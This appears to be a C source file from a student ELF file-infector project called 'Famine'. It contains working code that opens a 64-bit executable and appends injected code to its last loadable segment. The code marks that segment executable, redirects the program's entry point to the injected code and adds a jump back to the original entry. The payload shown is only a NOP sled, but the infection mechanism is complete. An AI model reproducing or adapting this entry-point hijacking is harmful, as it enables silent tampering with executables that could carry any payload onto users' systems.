#include "virus.h"

#define CODE_SZ 0x1000

static void CleanPayloadAreaAndShiftFileContent(int fd, struct pheaders64 *pHdrs, struct ELFheaders64 fHdr, int last_load_seg) {
    unsigned char tmp[0x3000];

    ft_syscall(LSEEK, (void *)fd, (void *)(pHdrs[last_load_seg].p_offset + pHdrs[last_load_seg].p_filesz), 0, 0);
    unsigned long int bytes = ft_syscall(READ, (void *)fd, (void *)tmp, (void *)0x3000, 0);

    unsigned long int decalage = CODE_SZ + pHdrs[last_load_seg].p_memsz;
    ft_syscall(LSEEK, (void *)fd, (void *)(pHdrs[last_load_seg].p_offset + decalage), 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)tmp, (void *)bytes, 0);

    for (int i = 0; i < 0x3000; i++)
        tmp[i] = 0;
    ft_syscall(LSEEK, (void *)fd, (void *)(pHdrs[last_load_seg].p_offset + pHdrs[last_load_seg].p_filesz), 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)tmp, (void *)(decalage - pHdrs[last_load_seg].p_filesz) , 0);
}

static void    change_program_header(int fd, struct sheaders64 *sHdrs, struct pheaders64 *pHdrs, struct ELFheaders64 fHdr) {
    ft_syscall(LSEEK, (void *)fd, (void *)0, 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)&fHdr, (void *)0x40, 0);
    ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_phoff, 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)pHdrs, (void *)(fHdr.e_phnum * fHdr.e_phentsize), 0);
    ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0);
}

void addJump(int fd, long unsigned int offset) {
    unsigned char jmp_code[] = {0xE9};

    offset -= 4;
    ft_syscall(WRITE, (void *)fd, (void *)jmp_code, (void *)sizeof(jmp_code), 0);
    ft_syscall(WRITE, (void *)fd, (void *)&offset, (void *)4, 0);
}

static void insertCode(int fd, struct pheaders64 *pHdrs, struct ELFheaders64 fHdr, int last_load_seg) {
    unsigned char code[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

    CleanPayloadAreaAndShiftFileContent(fd, pHdrs, fHdr, last_load_seg);

    ft_syscall(LSEEK, (void *)fd, (void *)(pHdrs[last_load_seg].p_offset + pHdrs[last_load_seg].p_memsz), 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)code, (void *)(sizeof(code) - 1), 0);
    addJump(fd, fHdr.e_entry - (pHdrs[last_load_seg].p_paddr + pHdrs[last_load_seg].p_memsz + sizeof(code)));
}

unsigned long int    writeFile(int fd, struct ELFheaders64 fHdr) {
    const char signature[] = "Famine version 1.0 (c)oded by <pgoudet>-<Mastermind pgoudet>";
    struct sheaders64 sHdrs[fHdr.e_shnum];
    struct pheaders64 pHdrs[fHdr.e_phnum];
    int last_load_seg;
    int last_load_sec;

    ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0);
    ft_syscall(READ, (void *)fd, (void *)sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0);
    ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_phoff, 0, 0);
    ft_syscall(READ, (void *)fd, (void *)pHdrs, (void *)(fHdr.e_phnum * fHdr.e_phentsize), 0);
    last_load_seg = get_last_load_segment(pHdrs, fHdr);
    last_load_sec = findLastLoadSection(sHdrs, fHdr, pHdrs[last_load_seg]);

    if (increaseFileSize(fd, fHdr, sHdrs) == 1)
        return (0);
    insertCode(fd, pHdrs, fHdr, last_load_seg);
    fHdr.e_entry = pHdrs[last_load_seg].p_paddr + pHdrs[last_load_seg].p_memsz;
    fHdr.e_shoff += CODE_SZ + (pHdrs[last_load_seg].p_memsz - pHdrs[last_load_seg].p_filesz);
    sHdrs[last_load_sec].sh_size += CODE_SZ;
    sHdrs[last_load_sec].sh_type = SHT_PROGBITS;
    sHdrs[fHdr.e_shstrndx].sh_offset += CODE_SZ + (pHdrs[last_load_seg].p_memsz - pHdrs[last_load_seg].p_filesz);

    pHdrs[last_load_seg].p_memsz += CODE_SZ;
    pHdrs[last_load_seg].p_filesz = pHdrs[last_load_seg].p_memsz;
    pHdrs[last_load_seg].p_flags |= PF_X;

    change_program_header(fd, sHdrs, pHdrs, fHdr);
    return (0);

}